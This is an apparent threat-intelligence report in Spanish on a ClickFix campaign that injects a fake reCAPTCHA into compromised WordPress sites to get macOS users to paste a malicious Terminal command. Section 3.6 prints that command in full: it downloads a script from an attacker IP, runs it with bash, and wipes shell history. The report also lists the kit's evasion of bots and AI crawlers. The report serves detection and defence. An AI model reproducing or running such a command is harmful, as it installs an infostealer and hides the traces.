@@ -1,0 +1,275 @@
+================================================================================
+  Macfinger: ClickFix con reCAPTCHA falso servido desde WordPress comprometidos
+  Campana CF-2026-0923  ·  TLP:CLEAR  ·  Intellroom Threat Intelligence
+  Fecha de analisis: 2026-09-23
+================================================================================
+
+0. FUENTE PRIMARIA Y QUE AGREGA ESTA FICHA
+--------------------------------------------------------------------------------
+La campana fue nombrada "Macfinger" y reportada primero por Brad Duncan en SANS
+Internet Storm Center, diario 33360, publicado el 2026-09-22 y actualizado el
+2026-09-23:
+    hxxps://isc.sans.edu/diary/Macfinger+ClickFix+campaign/33360
+
+SANS identifica el payload final como una variante de Atomic macOS Stealer (AMOS).
+Intellroom NO descargo ni analizo ese payload final: la identificacion como AMOS es
+de SANS y se cita, no se verifica aqui.
+
+Intellroom llego a la misma campana de forma independiente, pivoteando desde un
+sitio chileno comprometido, y la vinculo a la de SANS por un dato verificable: la
+URL del C2 dentro de la compilacion vieja del payload es IDENTICA a una de las que
+publico SANS (seccion 4).
+
+Lo que esta ficha agrega al registro publico, todo medido el 2026-09-23:
+  (a) La ROTACION del cargador: velvet-otter-glagceis[.]life, la unica que publico
+      SANS, ya fue reemplazada por ashen-trace-zephyr-draeix[.]life y, horas despues,
+      por misty-whirl-beacon-doa[.]life. Los dos ultimos conviven en sitios distintos.
+  (b) Un C2 NUEVO: 45[.]131[.]215[.]56, en la compilacion vigente del payload.
+  (c) La MIGRACION del C2 entre proveedores: de Aeza Group, sancionado por OFAC,
+      a NetCrafters OU. Toda la infraestructura observada, la de SANS y la propia,
+      cabe en esos dos ASN.
+  (d) El METODO de enumeracion de victimas: el nombre del archivo lleva el prefijo
+      de su SHA-256, verificado en las dos compilaciones.
+  (e) El TEST A/B del kit y su telemetria de conversion.
+  (f) La EVASION explicita de rastreadores de IA y de SEO.
+  (g) Un SEGUNDO INYECTOR independiente con redirector propio (beroniw[.]com).
+  (h) El COMANDO completo, con la cola antiforense.
+  (i) El dato de que urlscan.io puntua estos scans con score 0.
+
+1. RESUMEN
+--------------------------------------------------------------------------------
+Una campana masiva inyecta un cargador JavaScript en sitios WordPress de PYMEs de
+todo el mundo. El cargador muestra un reCAPTCHA FALSO superpuesto al sitio legitimo
+y convence al visitante de macOS de abrir la Terminal y pegar un comando que el kit
+le copio al portapapeles. El comando descarga y ejecuta un script desde un servidor
+del atacante, y despues borra el historial y limpia la pantalla para que la victima
+no vea lo que ejecuto. Segun SANS, lo que se instala es un infostealer de la familia
+AMOS.
+
+La tecnica es ClickFix (MITRE ATT&CK T1204.004, "Malicious Copy and Paste").
+
+Alcance observado: 580 scans en urlscan.io contienen el contenido exacto de UNA
+compilacion del payload (busqueda por hash), en una ventana de unos dos dias. Entre
+las victimas hay al menos SEIS sitios chilenos (.cl); cinco seguian sirviendo el
+cargador al cierre del analisis. Todas son sitios legitimos
+comprometidos y sus identidades NO se publican.
+
+Hallazgo de contexto: el scan de urlscan.io que sirvio de punto de partida tiene
+score 0 y malicious=false. El veredicto automatico NO detecta esta campana.
+
+2. LINEA DE TIEMPO (UTC)
+--------------------------------------------------------------------------------
+2025-07-01          OFAC sanciona a Aeza Group (AS210644 entre los ASN designados).
+2026-06-12 aprox.   beroniw[.]com registrado (edad ~103 dias al 2026-09-23).
+2026-09-05          Primeras observaciones publicas de beroniw[.]com/hwkop5.
+2026-09-19 10:36    Certificado TLS de skaedbraearaquiet[.]life (dominio de 4 dias).
+2026-09-22          SANS ISC publica el diario 33360 "Macfinger ClickFix campaign".
+2026-09-22 / 09-23  580 scans publicos contienen la compilacion 4f9db6afd06a.
+2026-09-23 06:46    Scan de la victima chilena. Cargador: velvet-otter-glagceis[.]life.
+2026-09-23 20:36    Verificacion propia de Intellroom. El mismo sitio ya carga desde
+                    ashen-trace-zephyr-draeix[.]life, la compilacion vigente es
+                    b96ad0785c08 y su C2 es 45[.]131[.]215[.]56. El identificador de
+                    la victima NO cambio.
+2026-09-23 21:02    Tercer cargador: misty-whirl-beacon-doa[.]life (185.173.144.58,
+                    AS203273). El mismo sitio chileno ya carga desde el. El dominio
+                    no estaba en ningun reporte previo y cayo en el ASN que esta
+                    ficha senala como pivote.
+
+3. CADENA DE ATAQUE
+--------------------------------------------------------------------------------
+3.1 Inyeccion. El sitio comprometido sirve dos inyecciones independientes:
+
+    (a) <script src="https://<dominio>.life/t.js?site=<32 hexadecimales>">
+        Cada sitio infectado tiene su PROPIO identificador. Eso implica un panel con
+        inventario de victimas.
+
+    (b) <script src="data:text/javascript;base64,...">
+        Decodifica en tres capas hasta un arreglo JSON con la misma URL repetida tres
+        veces: hxxps://beroniw[.]com/hwkOP5. Inyecta el script y reintenta con
+        onerror hasta agotar las tres entradas. Cuando urlscan.io lo visito,
+        redirigio a google.com: hace cloaking ante quien parece analista.
+
+3.2 Filtro de bots. t.js (889 bytes) retorna de inmediato si el User-Agent coincide
+    con: bot, crawler, spider, facebookexternalhit, Facebot, Twitterbot, LinkedInBot,
+    Slackbot, Discordbot, WhatsApp, TelegramBot, Googlebot, Bingbot, Baiduspider,
+    YandexBot, DuckDuckBot, Sogou, Exabot, ia_archiver, AhrefsBot, SemrushBot,
+    MJ12bot, DotBot, PetalBot, Bytespider, GPTBot, ChatGPT, ClaudeBot, Anthropic,
+    CCBot, DataForSeoBot.
+
+    Consecuencia: el payload no es indexable ni visible para escaneres SEO ni para
+    rastreadores de IA. Buscarlo en Google con site: o inurl: no devuelve nada, y esa
+    ausencia NO significa que el sitio este limpio.
+
+3.3 Camuflaje y test A/B. Declara window.__analyticsUrl y window.__analyticsSite
+    para parecer analitica. Lanza una moneda 50/50, la guarda en localStorage bajo
+    la clave __ab_v y carga:
+        variante A  ->  /ext.<12 hex>.js
+        variante B  ->  /ext-b.<12 hex>.js
+    En paralelo carga /t.<12 hex>.js, la telemetria, que reporta por POST a /collect.
+
+    "ext-b" significa literalmente "Extended script B".
+
+3.4 El hash del nombre es el SHA-256 del archivo. Verificado en DOS compilaciones:
+        ext-b.4f9db6afd06a.js -> 4f9db6afd06aab4045d89a679191e154cc8cd283392d1f3bd16ac31347e1c3ac
+        ext-b.b96ad0785c08.js -> b96ad0785c0861c24cb9bed7fbfb71368748944bd5c74878788dd1f907a866d6
+
+    Y el servidor lo valida: al pedir la compilacion anterior responde HTTP 404 con
+    el cuerpo, textual:
+        // Extended script B version mismatch. Requested: 4f9db6afd06a, Current: b96ad0785c08
+
+3.5 reCAPTCHA falso. El payload (192.742 bytes en la compilacion vigente, ofuscado
+    con obfuscator.io: arreglo rotado, base64 y RC4) dibuja un reCAPTCHA falso con el
+    logo real de www[.]gstatic[.]com/recaptcha/api2/logo_48.png y los enlaces reales de
+    Privacidad y Terminos de Google. Esta traducido a unos 15 idiomas: ingles,
+    espanol, portugues, frances, aleman, italiano, japones, coreano, chino simplificado
+    y de Hong Kong, hindi, bengali, arabe, turco y vietnamita.
+
+    Detecta el sistema (Macintosh, iPad, iPhone, iPod) y guia: abrir Spotlight con
+    Command + Espacio, escribir "Terminal", pegar con Command + V y presionar Enter. El
+    comando se entrega por navigator.clipboard.writeText.
+
+    Telemetria en el codigo: captcha_real_impression, captcha_any_click,
+    captcha_mouse, verifying_action, captcha_abandoned, force_fake_captcha,
+    fake_captcha_lang.
+
+3.6 El comando (detalle y metodo en evidencia_comando_reconstruido.txt):
+
+      echo 'I am not a robot - reCAPTCHA Verification ID: <6 digitos>' && (cd /tmp &&
+      curl -kfsSL "hxxp://45[.]131[.]215[.]56/8031e818c7a46?force=1" -o .<6 letras> &&
+      bash .<6 letras> && rm -f .<6 letras>) > /dev/null 2>&1 & clear;
+      printf '\033[3J';
+      history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null;
+      fc -p /dev/null 2>/dev/null;
+      printf '\n  \033[32m[check] Verification successful\033[0m\n\n'
+
+    La compilacion vigente trae ademas una variante autocontenida:
+      echo '...' && echo '<base64>' | base64 -D | bash
+
+    El echo inicial es el senuelo. curl -k ignora certificados. El archivo destino es
+    oculto y con nombre aleatorio en /tmp, y se borra tras ejecutarse. Todo corre en
+    segundo plano y en silencio. clear mas printf '\033[3J' borra el scroll de la
+    Terminal, history -d y fc -p borran el historial, y el ultimo printf muestra en
+    verde "Verification successful" para cerrar el engano. base64 -D con mayuscula
+    es sintaxis de macOS.
+
+4. INFRAESTRUCTURA Y MIGRACION
+--------------------------------------------------------------------------------
+Todas las IPs conocidas de la campana caen en SOLO DOS sistemas autonomos:
+
+  AS210644  Aeza Group LLC  (sancionado por OFAC el 2025-07-01)
+    45[.]150[.]33[.]128       C2 de la compilacion vieja. Amsterdam, NL.
+                             [publicado por SANS y confirmado por Intellroom dentro
+                             del payload 4f9db6afd06a]
+    95[.]163[.]153[.]80:8133  Publicado por SANS. Viena, AT. [NO verificado aqui]
+    193[.]188[.]22[.]246      skaedbraearaquiet[.]life. Helsinki, FI.
+
+  AS203273  NetCrafters OU
+    45[.]131[.]215[.]56       C2 de la compilacion VIGENTE. Frankfurt, DE. [NUEVO]
+    62[.]60[.]155[.]142       velvet-otter-glagceis[.]life. Londres, GB.
+    138[.]124[.]60[.]214      ashen-trace-zephyr-draeix[.]life. Charlotte, US. [NUEVO]
+    185[.]173[.]144[.]58      misty-whirl-beacon-doa[.]life. Charlotte, US. [NUEVO]
+
+  Fuera de ambos: beroniw[.]com, detras de Cloudflare (104.21.1.174, 172.67.129.170).
+
+  Lectura: el servidor de descarga paso de Aeza a NetCrafters entre compilaciones, y
+  el cargador ya vivia en NetCrafters. Los dominios .life rotan cada pocos dias; los
+  dos ASN persisten. Ese es el pivote mas duradero de la campana.
+
+  Prueba hacia adelante: misty-whirl-beacon-doa[.]life aparecio DESPUES de escrita
+  esta seccion, en ningun reporte previo, y resolvio a AS203273. El pivote por ASN
+  anticipo un dominio que aun no se conocia.
+
+  Precision sobre la sancion: OFAC sanciono a Aeza Group y la prensa especializada
+  reporto que Aeza migro parte de su espacio a un ASN nuevo, AS211522, despues de la
+  designacion. Que AS210644 siga sirviendo esta campana en septiembre de 2026 se
+  observa en ipinfo.io, pero Intellroom no verifico quien opera hoy ese espacio.
+
+5. MITRE ATT&CK
+--------------------------------------------------------------------------------
+  T1204.004  User Execution: Malicious Copy and Paste   [VERIFICADO contra la matriz
+             vigente el 2026-09-23. Tactica: Execution, TA0002]
+  T1189      Drive-by Compromise
+  T1059.004  Command and Scripting Interpreter: Unix Shell
+  T1105      Ingress Tool Transfer
+  T1070.003  Indicator Removal: Clear Command History
+  T1070.004  Indicator Removal: File Deletion
+  T1036      Masquerading  (reCAPTCHA falso, y kit disfrazado de analitica)
+  T1027      Obfuscated Files or Information
+  T1584.001  Compromise Infrastructure: Domains  (los WordPress de las victimas)
+  T1608.004  Stage Capabilities: Drive-by Target
+
+  Solo T1204.004 se contrasto contra la pagina oficial en esta sesion. Los demas son
+  identificadores estables, pero no se reverificaron uno por uno.
+
+6. LO QUE NO ES UN IOC
+--------------------------------------------------------------------------------
+  - Los sitios que cargan el script. Son victimas. Bloquearlos castiga al
+    comprometido y no toca al atacante. Se avisa, no se bloquea.
+  - www[.]gstatic[.]com/recaptcha/ y google.com/intl/*/policies/. Recursos legitimos.
+  - Los nombres de bots del filtro. Aparecen porque el kit los EVADE.
+  - Las cadenas "analytics", __analyticsUrl, __analyticsSite. Son el disfraz.
+  - /tmp, curl y bash por si solos.
+  - Los ASN completos de Cloudflare, AS203273 y AS210644.
+  - El nombre "ClickFix". Es la tecnica, no este actor.
+
+7. COMO ENUMERAR VICTIMAS EN urlscan.io
+--------------------------------------------------------------------------------
+  Por contenido exacto (preferible):
+      hash:<SHA-256 completo del archivo>
+      hash:4f9db6afd06aab4045d89a679191e154cc8cd283392d1f3bd16ac31347e1c3ac  ->  580
+  Por nombre (mas amplio, con ruido):
+      filename:"ext-b.4f9db6afd06a.js"                                      ->  589
+  La diferencia son scans donde se pidio el nombre pero el contenido no era ese
+  archivo, por ejemplo un 404.
+
+  El cuerpo de cualquier respuesta se baja de urlscan.io/responses/<sha256>/ y llega
+  COMPRIMIDO EN GZIP: sin descomprimir, el hash no coincide.
+
+  Cuando la campana rote de compilacion, ambas consultas envejecen. Las que duran:
+  el patron /t.js?site= y las IPs de los dos ASN de la seccion 4.
+
+8. QUE NO SE PUDO VERIFICAR Y NO SE AFIRMA
+--------------------------------------------------------------------------------
+  - El payload final. No se descargo ni ejecuto nada desde los C2. La identificacion
+    como variante de AMOS es de SANS.
+  - Las huellas SHA-256 de archivos que publico SANS. Se reproducen en iocs.txt con
+    esa atribucion, no se contrastaron.
+  - 95[.]163[.]153[.]80:8133. Solo aparece en SANS.
+  - La variante A (ext.<hash>.js). Solo se analizo la variante B.
+  - El vector de compromiso inicial de los WordPress. No se examino ninguno por
+    dentro.
+  - La atribucion a un actor con nombre.
+  - El alcance real. 580 es lo que urlscan.io vio de UNA compilacion en dos dias: un
+    piso, no un total.
+
+9. ACCIONES RECOMENDADAS
+--------------------------------------------------------------------------------
+  Red:              bloquear las IPs y dominios de [BLOQUEAR] en iocs.txt, con fecha
+                    de revision.
+  Equipos macOS:    cazar curl -kfsSL hacia IP literal, un archivo oculto creado y
+                    ejecutado en /tmp, y el uso de history -d o fc -p.
+  Concientizacion:  un captcha legitimo NUNCA pide abrir la Terminal ni pegar un
+                    comando. Es el unico control que detiene la cadena antes de la
+                    ejecucion, porque todo lo anterior es invisible.
+  Sitios propios:   revisar el HTML SERVIDO, no el tema ni los plugins.
+
+10. FUENTES Y METODO
+--------------------------------------------------------------------------------
+  - SANS ISC, diario 33360, Brad Duncan. Fuente primaria. Admiralty: A2 (fuente
+    confiable y con historial; la parte que Intellroom pudo contrastar coincidio).
+  - urlscan.io: busqueda por filename y por hash, lectura de resultados via API y
+    descarga de cuerpos desde /responses/.
+  - Descarga directa de t.js, t.<hash>.js y ext-b.<hash>.js desde el cargador
+    vigente, con curl, sin ejecutar el codigo.
+  - Desofuscacion: solo las funciones puras del ofuscador, auditadas y ejecutadas
+    aisladas en Node. El payload nunca se ejecuto.
+  - ipinfo.io y RDAP de RIPE para perfilar IPs.
+  - Tesoro de EE.UU. y prensa especializada para la sancion de Aeza Group.
+  - attack.mitre.org para T1204.004.
+
+  Confianza: ALTA en la cadena tecnica, la infraestructura y el vinculo con SANS,
+  observados directamente. MEDIA en la identificacion del payload, que es de SANS.
+  NULA en atribucion.
+
+  Redactado con apoyo de IA. Las hipotesis de deteccion se validan antes de desplegar.
+================================================================================
